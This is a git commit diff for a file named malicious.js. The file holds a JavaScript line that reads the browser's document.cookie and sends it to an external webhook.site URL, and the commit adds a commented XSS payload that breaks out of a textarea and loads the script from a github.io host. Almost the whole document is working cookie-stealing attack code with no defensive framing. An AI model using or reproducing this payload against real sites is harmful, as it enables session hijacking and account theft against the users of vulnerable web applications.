5a287df80196f7d12f69e383bca3b423027b1e5b
Rafael Chuva <rafaelrain18@hotmail.com>
2024-12-05 15:46:26 +0000

    Update malicious.js

--- malicious.js
+++ malicious.js
@@ -1,2 +1,5 @@
 // malicious.js
 fetch('https://webhook.site/b2f7fd8e-a378-420f-9263-347656b19be4?cookie=' + encodeURIComponent(document.cookie));
+
+// Payload
+// </textarea><script src="https://rafaelrain18.github.io/xss-script/malicious.js"></script>
